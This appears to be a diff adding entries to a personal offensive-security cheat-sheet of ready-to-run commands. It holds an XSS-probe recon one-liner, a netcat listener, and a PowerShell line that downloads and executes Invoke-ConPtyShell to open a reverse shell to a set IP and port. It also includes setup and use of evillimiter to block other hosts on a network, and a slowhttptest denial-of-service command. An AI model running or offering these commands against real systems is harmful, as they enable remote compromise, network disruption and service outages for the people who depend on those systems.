@@ -1,3 +1,44 @@
 assetfinder http://example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
 _________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
 
+code 
+
+powershel
+-----------
+  (attacker)
+
++ stty raw -echo; (stty size; cat) | nc -lvnp 4040
++ cmd=powershell
+
++ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing);           Invoke-ConPtyShell ip computer target 4040
+
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.18.33 4040
+
+(target)
+_______________________________________________________________________________________________________________________________________________________________________________
+
+
+evillimiter
+--------------
++ git clone https://github.com/bitbrute/evillimiter.git
+
++ cd evillimiter
+
++ sudo python3 setup.py install
+
++ sudo  evillimiter
+
++ scan
+
++ hosts
+
++ block hosts
+
+______________________________________________________________________________________________________________________________________________________
+
+slowhttptest
+--------------
+
++ sudo apt install slowhttptest
+
++ slowhttptest -c 10000 -H -g -o slowhttp -I 10 -r 200 -t GET -u website -x 24 -p 3
